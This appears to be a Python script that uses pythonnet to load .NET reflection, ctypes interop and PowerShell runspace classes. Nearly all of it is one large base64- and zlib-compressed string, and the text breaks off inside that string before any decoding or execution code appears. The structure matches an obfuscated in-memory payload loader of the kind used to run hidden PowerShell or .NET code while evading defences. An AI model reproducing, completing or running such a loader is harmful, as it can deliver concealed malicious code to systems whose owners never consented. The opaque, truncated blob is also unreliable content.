import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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